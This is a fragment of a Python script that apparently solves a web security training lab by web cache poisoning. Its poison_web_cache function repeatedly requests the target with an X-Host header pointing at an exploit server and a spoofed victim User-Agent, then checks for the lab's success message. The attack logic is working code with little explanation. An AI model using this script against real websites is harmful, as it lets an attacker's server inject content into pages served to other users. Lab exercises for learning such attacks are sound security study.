...
def poison_web_cache(url, exploit_server_url, session):
    for i in range(100):
        response = session.get(url, headers={"X-Host": exploit_server_url.replace("https://", ""), "User-Agent": "Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"}, timeout=10)
...
def main():
    ...
    try:
        ...
        poison_web_cache(url, exploit_server_url, session)
        response = session.get(url, timeout=10)
        if "Congratulations, you solved the lab!" in response.text:
